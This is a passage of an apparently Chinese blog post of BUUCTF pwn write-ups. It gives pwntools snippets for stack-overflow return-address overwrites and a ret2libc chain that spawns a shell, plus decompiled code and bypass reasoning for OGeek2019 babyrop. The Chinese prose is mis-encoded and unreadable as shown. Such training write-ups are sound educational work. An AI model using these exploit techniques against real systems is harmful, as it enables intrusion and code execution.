<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>BUUCTF Pwn ç»ƒä¹ è®°å½• - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="BUUCTF Pwn ç»ƒä¹ è®°å½•"><meta property="og:description" content="ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/buu-pwn/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-12-14T21:46:20+00:00"><meta property="article:modified_time" content="2019-12-14T21:46:20+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUUCTF Pwn ç»ƒä¹ è®°å½•"><meta name=twitter:description content="ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/buu-pwn/><link rel=prev href=https://blog.sigmerc.top/qtable-ss-pagination/><link rel=next href=https://blog.sigmerc.top/elgamal-ecc/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"BUUCTF Pwn ç»ƒä¹ è®°å½•","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/buu-pwn\/"},"genre":"posts","keywords":"æ•´æ•°æº¢å‡º, æ ˆæ¼æ´, fsb, å †æ¼æ´","wordcount":11597,"url":"https:\/\/blog.sigmerc.top\/buu-pwn\/","datePublished":"2019-12-14T21:46:20+00:00","dateModified":"2019-12-14T21:46:20+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> æ–‡ç«  </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> æ ‡ç­¾ </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> åˆ†ç±» </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=æœç´¢æ–‡ç« æ ‡é¢˜æˆ–å†…å®¹... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=æœç´¢><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=æ¸…ç©º><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=åˆ‡æ¢ä¸»é¢˜><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=æœç´¢æ–‡ç« æ ‡é¢˜æˆ–å†…å®¹... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=æœç´¢><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=æ¸…ç©º><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>å–æ¶ˆ</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>æ–‡ç« </a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>æ ‡ç­¾</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>åˆ†ç±»</a><a href=javascript:void(0); class="menu-item theme-switch" title=åˆ‡æ¢ä¸»é¢˜>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>ç›®å½•</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF Pwn ç»ƒä¹ è®°å½•</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>æ”¶å½•äº <a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>äºŒè¿›åˆ¶å®‰å…¨</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2019-12-14>2019-12-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;çº¦ 11597 å­—&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;é¢„è®¡é˜…è¯» 24 åˆ†é’Ÿ&nbsp;<span id=/buu-pwn/ class=leancloud_visitors data-flag-title="BUUCTF Pwn ç»ƒä¹ è®°å½•">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;æ¬¡é˜…è¯»
</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>ç›®å½•</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#part-i>Part I</a><ul><li><a href=#test_your_nc>test_your_nc</a></li><li><a href=#rip>rip</a></li><li><a href=#warmup_csaw_2016>warmup_csaw_2016</a></li><li><a href=#pwn1_sctf_2016>pwn1_sctf_2016</a></li><li><a href=#ciscn_2019_c_1>ciscn_2019_c_1</a></li><li><a href=#ciscn_2019_n_1>ciscn_2019_n_1</a></li><li><a href=#ciscn_2019_en_2>ciscn_2019_en_2</a></li></ul></li><li><a href=#part-ii>Part II</a><ul><li><a href=#ogeek2019babyrop>[OGeek2019]babyrop</a></li><li><a href=#babyheap_0ctf_2017>babyheap_0ctf_2017</a></li><li><a href=#get_started_3dsctf_2016>get_started_3dsctf_2016</a></li><li><a href=#not_the_same_3dsctf_2016>not_the_same_3dsctf_2016</a></li><li><a href=#ç¬¬äº”ç©ºé—´-2019-å†³èµ›pwn5>[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5</a></li><li><a href=#ciscn_2019_n_8>ciscn_2019_n_8</a></li><li><a href=#babyfengshui_33c3_2016>babyfengshui_33c3_2016</a></li><li><a href=#ciscn_2019_s_3>ciscn_2019_s_3</a></li><li><a href=#harekazectf2019baby_rop>[HarekazeCTF2019]baby_rop</a></li><li><a href=#pwn2_sctf_2016>pwn2_sctf_2016</a></li><li><a href=#ez_pz_hackover_2016>ez_pz_hackover_2016</a></li><li><a href=#ciscn_2019_ne_5>ciscn_2019_ne_5</a></li><li><a href=#harekazectf2019baby_rop2>[HarekazeCTF2019]baby_rop2</a></li><li><a href=#ciscn_2019_n_5>ciscn_2019_n_5</a></li><li><a href=#ciscn_2019_final_3>ciscn_2019_final_3</a></li><li><a href=#ciscn_2019_es_2>ciscn_2019_es_2</a></li><li><a href=#roarctf_2019_easy_pwn>roarctf_2019_easy_pwn</a></li><li><a href=#ciscn_2019_n_3>ciscn_2019_n_3</a></li><li><a href=#hitcon2014_stkof>hitcon2014_stkof</a></li></ul></li><li><a href=#part-iii>Part III</a><ul><li><a href=#sleepyholder_hitcon_2016>sleepyHolder_hitcon_2016</a></li><li><a href=#secretholder_hitcon_2016>secretHolder_hitcon_2016</a></li><li><a href=#bcloud_bctf_2016>bcloud_bctf_2016</a></li><li><a href=#lctf2016_pwn200>lctf2016_pwn200</a></li><li><a href=#zctf2016_note2>zctf2016_note2</a></li><li><a href=#zctf2016_note3>zctf2016_note3</a></li><li><a href=#0ctf_2018_heapstorm2>0ctf_2018_heapstorm2</a></li><li><a href=#houseoforange_hitcon_2016>houseoforange_hitcon_2016</a></li><li><a href=#ciscn_2019_final_2>ciscn_2019_final_2</a></li><li><a href=#å¼ºç½‘æ¯_æ‹Ÿæ€_stkof>å¼ºç½‘æ¯_æ‹Ÿæ€_stkof</a></li><li><a href=#axb_2019_heap>axb_2019_heap</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚</p><h2 id=part-i>Part I</h2><h3 id=test_your_nc>test_your_nc</h3><p>nc ç›´æ¥è¿ï¼Œ<code>cat flag</code>ã€‚</p><h3 id=rip>rip</h3><p>æ ˆæº¢å‡ºï¼Œå¯ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæ³¨æ„ 64 ä½ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xf</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;fun&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=warmup_csaw_2016>warmup_csaw_2016</h3><p>å’Œä¸Šé¢˜å…¶å®ä¸€æ ·ï¼Œç¨‹åºä¸­å­˜åœ¨åé—¨ï¼Œç›´æ¥è¿”å›è¿‡å»ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x40</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40060d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=pwn1_sctf_2016>pwn1_sctf_2016</h3><p>ç›´æ¥è¿è¡Œå‡ æ¬¡æˆ–è€…æºç å®¡è®¡å¯ä»¥å‘ç°æ˜¯å°†è¾“å…¥çš„ <code>I</code> æ›¿æ¢ä¸º <code>you</code>ï¼Œå…¶ä½™çš„å…¶å®å’Œä¸Šé¢ä¸€æ ·ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;I&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x3c</span> <span class=o>//</span> <span class=mi>3</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;get_flag&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_c_1>ciscn_2019_c_1</h3><p>å¼€å¯äº† NX ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰æœªé™åˆ¶é•¿åº¦çš„ <code>gets</code>ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæ˜¯ ROP æ ˆæº¢å‡ºã€‚IDA æœä¸€ä¸‹ stringï¼Œå¯ä»¥å‘ç°æœ‰ libc å¯ä»¥ç”¨ï¼Œè€ƒè™‘ ret2libcã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400c83</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>ru</span><span class=p>(</span><span class=s1>&#39;!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>ru</span><span class=p>(</span><span class=s1>&#39;ed</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x58</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;@</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>leak</span><span class=p>,</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x58</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_n_1>ciscn_2019_n_1</h3><p>ä¾ç„¶æ˜¯æœ€ç®€å•çš„æ— ä¿æŠ¤ <code>gets</code> å¹¶ä¸”ç¨‹åºä¸­æœ‰ <code>system("cat /flag")</code>ï¼Œæ‰¾åˆ°åè€…åœ°å€è¿”å›è¿‡å»å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>cat_flag</span> <span class=o>=</span> <span class=mh>0x4006be</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>ru</span><span class=p>(</span><span class=s1>&#39;number.</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span><span class=p>,</span> <span class=n>cat_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ciscn_2019_en_2>ciscn_2019_en_2</h3><p>å’Œä¸Šä¸Šé¢˜ä¸€æ ·ã€‚</p><h2 id=part-ii>Part II</h2><h3 id=ogeek2019babyrop>[OGeek2019]babyrop</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-14h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+Bh] [ebp-Dh]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>sub_80486BB</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fd</span><span class=o>&gt;</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=n>sub_804871F</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_80487D0</span><span class=p>(</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>main</code> ä¸­ <code>sub_80486BB</code> ç”¨äºåˆå§‹åŒ–ï¼Œç„¶åå°†ä¸€ä¸ªéšæœºæ•°ä¼ å…¥ <code>sub_804871F</code>ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_804871F</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>size_t</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>s</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-4Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span> <span class=c1>// [esp+2Ch] [ebp-2Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [esp+33h] [ebp-25h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>ssize_t</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [esp+4Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sprintf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=s>&#34;%ld&#34;</span><span class=p>,</span> <span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x20u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>buf</span><span class=p>[</span><span class=n>v6</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>strncmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s</span><span class=p>,</span> <span class=n>v1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s>&#34;Correct</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>8u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œçš„ <code>a1</code> å°±æ˜¯ä¼ å…¥çš„éšæœºæ•°ï¼Œç„¶åè¦æ±‚æˆ‘ä»¬çš„è¾“å…¥å’Œéšæœºæ•°ç»è¿‡ <code>strncmp</code> æ¯”è¾ƒåå®Œå…¨ç›¸åŒï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ <code>\x00</code> ä½¿å¾— <code>strlen</code> å‡½æ•°è¿”å› 0ï¼Œä»è€Œä½¿å¾— <code>strncmp</code> å‡½æ•°åªæ¯”è¾ƒ 0 ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±èƒ½ç»•è¿‡è¿™é‡Œçš„ <code>exit(0)</code>ï¼Œå¹¶è¿”å› <code>v5</code>ã€‚æ³¨æ„åˆ°è¿™é‡Œçš„è¿”å›å€¼ <code>v5</code> åœ¨ <code>ebp-0x25</code>ï¼Œè·ç¦»æˆ‘ä»¬èƒ½æ§åˆ¶çš„ä½äº <code>ebp-0x2c</code> çš„å˜é‡ <code>buf</code> ç›¸å·® <code>0x7</code>ï¼Œå°äºè¿™é‡Œ <code>read</code> çš„é•¿åº¦é™åˆ¶ <code>0x20</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶ <code>v5</code> çš„å€¼ï¼Œä»è€Œæ§åˆ¶ <code>main</code> ä¸­çš„ <code>v2</code>ã€‚</p><p>éšåï¼Œ<code>v2</code> ä¼šè¢«ä¼ å…¥ <code>sub_80487D0</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>ssize_t</span> <span class=kr>__cdecl</span> <span class=nf>sub_80487D0</span><span class=p>(</span><span class=kt>char</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>ssize_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+11h] [ebp-E7h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>a1</span> <span class=o>==</span> <span class=mi>127</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0xC8u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=n>a1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
